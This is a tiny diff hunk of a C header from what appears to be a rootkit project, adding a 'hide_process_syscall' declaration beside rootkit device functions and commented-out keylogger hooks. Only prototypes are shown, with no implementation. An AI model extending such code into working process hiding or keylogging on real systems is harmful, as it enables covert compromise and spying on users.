@@ -15,7 +15,7 @@
 
 int make_rootkit_dev(void);
 void destroy_rootkit_dev(void);
-
+void hide_process_syscall(void);
 // void init_keylogger(void);
 // void cleanup_keylogger(void);
 
